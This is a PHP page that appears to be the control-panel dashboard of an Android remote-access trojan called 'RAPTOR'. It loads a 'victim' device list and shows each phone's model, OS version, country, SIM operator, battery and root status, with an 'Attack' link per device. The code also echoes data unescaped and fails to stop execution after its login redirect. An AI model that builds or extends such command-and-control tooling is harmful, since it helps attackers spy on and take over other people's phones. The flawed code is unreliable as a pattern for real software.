<?php 
require_once '../private/session_manager.php';

if(!isLogin()){
   header('Location: login.php');
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>RAPTOR</title>
    <link href="./css/theme.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="./css/toastify.css">
    <script type="text/javascript" src="./js/toastify.js"></script>


    <style>
        .tall-row {
            margin-top: 40px;
        }
        .modal {
            position: relative;
            top: auto;
            right: auto;
            left: auto;
            bottom: auto;
            z-index: 1;
            display: block;
        }
    </style>
</head>

<body>

<nav class="navbar navbar-default navbar-static-top">
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4">
                <a class="navbar-brand" href="index.php">RAPTOR Control Paneli</a>
            </div>
        </div>
    </div>
</nav>

<div class="container">

    <br><br><br>

    <div class="row">
        <div class="col-md-10 col-lg-offset-1">
            <div class="well">
                <br><br>

                <legend>Device List</legend>

                <div class="row">
                    <div class="col-lg-12">
                        <table class="table table-striped table-hover ">
                            <thead>
                            <tr>
                                <th>#</th>
                                <th>DEVICE</th>
                                <th>VERSION</th>
                                <th>COUNTRY</th>
                                <th>SIM OPERATOR</th>
                                <th>CHARGE</th>
                                <th>IS ROOTED</th>
                                <th>ACTION</th>
                            </tr>
                            </thead>
                            <tbody>
                            <?php

                            $strJsonFileContents = file_get_contents("../private/storage/device_list.json");
                            $victim_array = json_decode($strJsonFileContents, true);
                            $index_victim = 1;

                            foreach ($victim_array["device_list"] as $field => $value) {

                                echo '<tr>';
                                echo '<td>'.$index_victim.'</td>';
                                echo '<td>'.strtoupper($value['DEVICE_MODEL']).'</td>';
                                echo '<td>'.$value['SOFTWARE_VERSION'].'</td>';
                                echo '<td>'.$value['COUNTRY'].'</td>';
                                echo '<td>'.$value['SIM_OPERATOR'].'</td>';
                                echo '<td>'.$value['CHARGE'].'</td>';
                                echo '<td>'.$value['IS_ROOTED'].'</td>';
                                echo '<td><a href="kontrol-panel.php?target='.$value['UNIQUE_ID'].'&type=1'.'">Attack</a></td>';
                                echo '</tr>';
                                $index_victim += 1;
                            }
                            ?>
                            </tbody>

                        </table>
                    </div>
                </div>

                <br><br>
            </div>
        </div>
    </div>

    <br><br>

    <div class="row tall-row">
        <div class="col-md-offset-8">
            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
        </div>
    </div>

</div>

</body>
</html>
